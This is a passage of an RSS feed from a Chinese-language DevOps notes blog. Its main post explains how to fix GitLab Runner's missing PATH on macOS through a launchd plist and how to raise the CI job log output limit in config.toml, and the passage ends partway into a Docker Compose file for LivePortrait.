<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="https://www.geekery.cn/rss.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <atom:link href="https://www.geekery.cn/rss.xml" rel="self" type="application/rss+xml"/>
    <title>运维开发绿皮书</title>
    <link>https://www.geekery.cn/</link>
    <description>放置运维开发笔记、搜集、摘录、实践，保持好奇心，看文需谨慎，后果很严重！</description>
    <language>zh-CN</language>
    <pubDate>Wed, 07 May 2025 10:17:56 GMT</pubDate>
    <lastBuildDate>Wed, 07 May 2025 10:17:56 GMT</lastBuildDate>
    <generator>@vuepress/plugin-feed</generator>
    <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
    <category>Tools</category>
    <item>
      <title>牛马时钟</title>
      <link>https://www.geekery.cn/free-service/OxHorseClock.html</link>
      <guid>https://www.geekery.cn/free-service/OxHorseClock.html</guid>
      <source url="https://www.geekery.cn/rss.xml">牛马时钟</source>
      <description>牛马时钟</description>
      <pubDate>Thu, 01 May 2025 02:24:28 GMT</pubDate>
      <content:encoded><![CDATA[
]]></content:encoded>
    </item>
    <item>
      <title>Gitlab-Runner的一些问题</title>
      <link>https://www.geekery.cn/note-book/Gitlab/Gitlab-Runner%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98.html</link>
      <guid>https://www.geekery.cn/note-book/Gitlab/Gitlab-Runner%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Gitlab-Runner的一些问题</source>
      <description>Gitlab-Runner的一些问题 Gitlab在mac下环境变量和用户环境变量不一致的问题 相关信息 具体问题表现： 在zsh和bash下可以运行flutter命令，但是在pipline里面会显示flutter: command not found 解决方法 编辑服务的plist文件，新增环境变量， 编辑服务文件 /Users/mac/Librar...</description>
      <pubDate>Fri, 25 Apr 2025 09:57:24 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>Gitlab在mac下环境变量和用户环境变量不一致的问题</h2>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>具体问题表现： 在zsh和bash下可以运行flutter命令，但是在pipline里面会显示flutter: command not found</p>
</div>
<h3>解决方法</h3>
<p>编辑服务的plist文件，新增环境变量，</p>
<p>编辑服务文件 /Users/mac/Library/LaunchAgents/gitlab-runner.plist</p>
<div class="language-xml line-numbers-mode" data-highlighter="shiki" data-ext="xml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;!</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">DOCTYPE</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> plist</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">plist</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"1.0"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">dict</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;Disabled&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;KeepAlive&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;Label&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;gitlab-runner&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;ProgramArguments&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">array</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;/opt/homebrew/bin/gitlab-runner&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;run&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;--config&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;/Users/mac/.gitlab-runner/config.toml&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;--working-directory&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;/Users/mac&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;--service&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;gitlab-runner&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;--syslog&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">array</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line highlighted"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;EnvironmentVariables&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line highlighted"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">dict</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line highlighted"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">          &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;PATH&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line highlighted"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">          &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;/opt/homebrew/bin/:/opt/devTools/flutter/bin:/opt/homebrew/bin:/opt/homebrew/sbin:/opt/devTools/flutter/bin:/usr/local/bin:/System/Cryptexes/App/usr/bin:/usr/bin:/bin:/usr/sbin:/sbin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/local/bin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/bin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/appleinternal/bin:/Library/Apple/usr/bin&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line highlighted"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">dict</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;RunAtLoad&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;SessionCreate&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;StandardErrorPath&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;/Users/mac/gitlab-runner.err.log&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;StandardOutPath&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;/Users/mac/gitlab-runner.out.log&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">dict</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">plist</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行命令</p>
<p>先加载配置及然后停止然后启动。（别重启，有概率报错，可能是bug）</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">launchctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> load</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/Library/LaunchAgents/homebrew.mxcl.gitlab-runner.plist</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">gitlab-runner</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">gitlab-runner</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> start</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这样问题就迎刃而解了</p>
<h2>Gitlab的CI中日志超过4194304bytes的问题</h2>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>报错信息： 在GitLab面板的job里面显示日志超过4MB无法继续显示更多日志，在写gitlab-ci文件的时候如果遇到报错根本无法调试，这是一个致命的问题。尤其是xcode编译xcarchive然后再打包为ipa文件的时候，日志动不动就是5MB多，下面的文档给出解决方案。</p>
<p>Job's log exceeded limit of 4194304 bytes</p>
</div>
<h3>问题的原因</h3>
<p>根据描述及任务执行状态的初步判断，是因为控制台输出的信息量过大，超出了GitLab Runner默认允许的大小。</p>
<h3>解决方法</h3>
<ul>
<li>找到gitlab-runner的配置文件，（如果找不到可以使用命令 <code>gitlab-runner list</code> 命令能够看到字段ConfigFile，即为当前使用的runner配置）</li>
<li>在runner字段下添加output_limit字段设置大小，我这写为1048576大小，也就是最大1G</li>
<li>重启runner</li>
</ul>
<p>在mac中如果使用的是brew安装的runner，默认配置文件在</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /Users/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">用户</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">名&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/.gitlab-runner/config.toml</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>修改好的配置</p>
<div class="language-toml line-numbers-mode" data-highlighter="shiki" data-ext="toml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">concurrent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">check_interval</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">shutdown_timeout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">session_server</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  session_timeout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1800</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[[</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">runners</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"C4a0-170 Mac Bash 6c32g500g"</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  url</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"http://gitlabr.c4a.com/"</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  id</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">34</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  token</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"EK...BM"</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  token_obtained_at</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2024-06-06T09:37:57Z</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  token_expires_at</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0001-01-01T00:00:00Z</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  executor</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"shell"</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  output_limit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1048576</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  [</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">runners</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">custom_build_dir</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  [</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">runners</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cache</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    MaxUploadedArchiveSize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    [</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">runners</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cache</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">s3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    [</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">runners</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cache</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">gcs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    [</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">runners</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cache</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">azure</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>重启runner</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">gitlab-runner</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>结果</h3>
<p>经过验证，完美解决问题。</p>
]]></content:encoded>
    </item>
    <item>
      <title>Docker运行kwaivgi-liveportrait</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E8%BF%90%E8%A1%8Ckwaivgi-liveportrait.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E8%BF%90%E8%A1%8Ckwaivgi-liveportrait.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker运行kwaivgi-liveportrait</source>
      <description>Docker运行kwaivgi-liveportrait Docker Compose File 运行容器 将上面的composefile 保存为 docker-comopose.yaml然后运行下面的命令进行安装：</description>
      <pubDate>Wed, 23 Apr 2025 05:18:00 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>Docker Compose File</h2>
<div class="language-yaml line-numbers-mode" data-highlighter="shiki" data-ext="yaml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"3"</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">services</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    kwaivgi-liveportrait</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        stdin_open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        tty</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        deploy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            resources</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">                reservations</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
